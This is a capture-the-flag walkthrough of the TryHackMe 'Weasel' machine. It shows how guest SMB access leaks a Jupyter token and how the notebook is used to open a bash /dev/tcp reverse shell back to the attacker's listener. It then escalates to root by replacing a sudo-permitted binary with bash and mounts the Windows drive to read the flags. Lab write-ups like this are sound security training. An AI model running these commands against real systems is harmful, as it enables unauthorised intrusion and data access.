# Weasel

Link : [Weasel](https://tryhackme.com/room/weasel)

## High-Level Overview

This machine is used by a data science team for their project developments.

## Tools Needed

* Nmap
* Smbmap
* Nc
* Bash

## Walkthrough

After starting the machine, we proceed to do an initial scan using `nmap`:

```bash
$ sudo nmap -sS -A -Pn -vv MACHINE:IP
```

We found the following ports open and services running:

* 22 - ssh
* 135 - Microsoft Windows RPC
* 139 - Microsoft Windows netbios-ssn
* 445 - Possible microsoft-ds
* 3389 - Microsoft Terminal services - ms-wbt-server
* 8888 - http - Jupyter Notebook

The `Nmap` scan reveals that there is a jupyter notebook running on port 8888. There is a `http-robots.txt` file that disallows 1 entry which is `/`. If we type `http://MACHINE:IP:8888/` into the browser, it resolves itself into the page `http://MACHINE:IP:8888/login?next=%2Ftree%3F`. Access is permitted remotely, but we need to supply a token or password to go any further.

We will further investigate the host using `smbmap` by running the command:

```bash
$ smbmap -H MACHINE:IP -u guest
```

We can find 4 disk entries: `ADMIN$`, `C$`, `datasci-team`, `IPC$`. The `datasci-team` entry has read and write permissions so we will see if we can get access to it by typing the command:

```bash
$ smbclient -U guest //MACHINE:IP/datasci-team
```

A prompt will be asking us to supply a password, however there doesn't seem to be one so we can just press enter. Now we have access to the share.

There are a lot of items, notably a `misc` folder that contains a file `jupyter-token.txt`. We need to download it on our attacking machine by running the command below:

```bash
> get jupyter-token.txt
```

We can use this token to open the Jupyter Notebook instance in this browser. From here, we can start a new `Python` notebook and try to gather more information. We can issue commands such by typing them in code blocks and then pressing `Run`:

```bash
!whoami
# output for the command will be shown as: dev-datasci
```

We will use this functionality to get a reverse shell. On the attacker machine, open a `nc` listener using the command:

```bash
$ nc -lvnp 8888
```

In the Python notebook, type the command and then hit `Run`

```bash
$ !/bin/bash -c 'bash -i >& /dev/tcp/MACHINE:IP/8888 0>&1'
```

And now we have a reverse shell! Seems like this machine is actually a WSL running from a Windows host. We can confirm with the command `cat /etc/wsl.conf`. There are no flags on this machine, so we need to find a way to escalate privileges and break into the actual Windows machine.

Going to the home folder of our currently logged in user using `cd ~`. Here we can find a file named `dev-datasci-lowpriv_id_ed25519`. It contains an OPENSSH private key.

Trying to find a way to escalate privileges, We can list the privileges for the current user using `sudo -l`. It seems we have `sudo` privileges over `/home/dev-datasci/.local/bin/jupyter`. However, running it as sudo using the command below, tells us this command doesn't exist.


```bash
$ sudo /home/dev-datasci/.local/bin/jupyter
```

We can try replacing this command with `/bin/bash` like shown below:

```bash
$ cp /bin/bash /home/dev-datasci/.local/bin/jupyter
```

After doing so, we can try to run the command using sudo to see if we can get root:

```bash
$ sudo /home/dev-datasci/.local/bin/jupyter
```

As root, we can mount the `C:` drive from our Windows host on this WSL environment using the command:

```bash
$ sudo mount -t drvfs C: /mnt/c
```

Going into `/mnt/c`, we find the contents of the `C` drive accessible. The user flag can be found in the `Desktop` folder of the user `dev-datasci-lowpriv`. The root flag is found in the `Desktop` folder of the `Administrator` user.